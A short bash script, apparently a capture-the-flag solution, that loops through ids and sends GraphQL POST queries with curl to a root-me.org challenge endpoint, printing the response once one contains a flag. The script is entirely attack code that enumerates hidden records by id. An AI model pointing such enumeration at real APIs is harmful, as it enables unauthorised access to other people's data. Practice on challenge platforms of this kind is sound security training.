for ((i = 0; i < 99; i++)); do
    response=$(curl -s --header "Content-Type: application/json" \
        --request POST \
        --data "{\"query\": \"{ IAmNotHere(very_long_id: $i) { very_long_id very_long_value } }\"}" \
        http://challenge01.root-me.org:59077/rocketql)

    if [[ $response == *"flag"* ]]; then
        echo "[+] FOUND FLAG at id=$i"
        echo "$response"
        break
    fi
done
